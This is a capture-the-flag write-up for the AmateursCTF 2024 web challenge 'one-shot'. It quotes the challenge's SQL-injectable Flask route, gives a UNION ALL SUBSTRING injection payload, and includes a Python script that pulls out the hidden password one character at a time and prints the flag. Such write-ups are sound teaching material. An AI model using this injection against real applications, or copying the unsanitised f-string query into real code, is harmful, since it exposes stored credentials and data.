---
title: "one-shot"
description: "my friend keeps asking me to play OneShot. i haven't, but i made this cool challenge!"
points: 184
solves: 282
author: Jozef Steinhübl
date: April 11 2024
---

## Introduction

![task](https://raw.githubusercontent.com/GerlachSnezka/amateursctf/main/assets/2024-web-one-shot.png)

In this challenge, we are given a website and its source code. We have to create a session, search for a pass and then guess the pass to get the flag.

## Analysis

After digging into the source code, we see a potential SQL injection in the `search` route. The `query` parameter is not sanitized and is directly used in the SQL query.

```python #1,5
query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
return f"""
<h2>Your results:</h2>
<ul>
{"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
</ul>
<h3>Ready to make your guess?</h3>
<form action="/guess" method="POST">
    <input type="hidden" name="id" value="{id}">
    <input type="text" name="password" placehoder="Password">
    <input type="submit" value="Guess">
</form>
"""
```

In the fifth line, we can see that each row from the query is displayed in the list. The first character of the password is displayed, and the rest of the characters are replaced with `*`.

## Solution

We can create a malicious query that will inject multiple `SUBSTRING` SQL functions to display each character of the password in a separate row.

```sql
%' OR 1=1 UNION ALL SELECT SUBSTRING(password, n, 1) FROM table_{id}
```

$$
\begin{align*}
& n \text{ represents the position of the character in the password} \\
& id \text{ is the id of the table}
\end{align*}
$$

> **Why UNION ALL?**  
> We must use `UNION ALL` instead of `UNION` because passwords can contain duplicate characters.

I created a script that will automate the process of building the query and extracting the password.

```python
import requests
import re

URL = "http://one-shot.amt.rs"


# Get session id
def get_session():
    res = requests.post(URL + "/new_session")
    return res.text.split('type="hidden" name="id" value="')[1].split('"')[0]


# Search for password, use malicious query
def search(session: str, query: str):
    query = query.replace("{id}", session)
    res = requests.post(URL + "/search", data={"id": session, "query": query})
    return re.findall(r"<li>(.*?)</li>", res.text)


# Guess the password
def guess(session: str, password: str):
    res = requests.post(URL + "/guess", data={"id": session, "password": password})
    return res.text


# Build a malicious query
def build_query():
    query = "%' OR 1=1"

    for n in range(1, 33):
        query += f" UNION ALL SELECT SUBSTRING(password, {n}, 1) FROM table_" + "{id}"

    return query + " --"


session = get_session()

vals = search(session, build_query())
vals = [val for val in vals if len(val) == 1] # get only characters
print(guess(session, "".join(vals)))
```

After running the script, we get the flag.

```
amateursCTF{go_union_select_a_life}
```